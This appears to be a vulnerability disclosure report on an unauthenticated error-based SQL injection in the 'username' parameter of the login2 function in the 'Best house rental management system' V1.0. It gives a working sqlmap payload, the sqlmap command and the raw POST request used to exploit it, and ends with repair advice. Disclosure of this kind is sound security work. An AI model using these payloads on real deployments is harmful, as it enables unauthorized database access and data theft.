# Best house rental management system V1.0 admin_class.php login2 SQL injection

# NAME OF AFFECTED PRODUCT(S)

- Best house rental management system

## Vendor Homepage

- [Best house rental management system project in php | SourceCodester](https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html)

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- K1nako

## VERSION(S)

- V1.0

## Software Link

- [Best house rental management system project in php | SourceCodester](https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html)

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was found in function "login2" of the file "/admin_class.php" of the 'Best house rental management system' project. The reason for this issue is that attackers inject malicious code from the parameter "username" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION

- During the security review of "Best house rental management system", discovered a critical SQL injection vulnerability in function "login2" of the file "/admin_class.php". This vulnerability stems from insufficient user input validation of the 'username' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

  

# **Code Analysis**

![image-20251011153450029](assets/image-20251011153450029.png)

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability type:

- error-based

## Vulnerability location:

- 'username' parameter

## Payload:

```
Parameter: #1* ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=1'||(SELECT 0x6e487564 WHERE 5473=5473 AND (SELECT 2068 FROM(SELECT COUNT(*),CONCAT(0x7178707171,(SELECT (ELT(2068=2068,1))),0x7176767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

![image-20251011153532865](assets/image-20251011153532865.png)

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

```
python sqlmap.py -r data.txt --dbs -v 3 --batch --level 5
//data.txt
POST /ajax.php?action=login2 HTTP/1.1
Host: 10.151.169.235:8833
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=cuq6v5v2e97ubeodt33s8k4ot9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

username=1*
```

# Attack results

![image-20251011153827467](assets/image-20251011153827467.png)

# Suggested repair



1. **Use prepared statements and parameter binding:** Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
2. **Input validation and filtering:** Strictly validate and filter user input data to ensure it conforms to the expected format.
3. **Minimize database user permissions:** Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
4. **Regular security audits:** Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.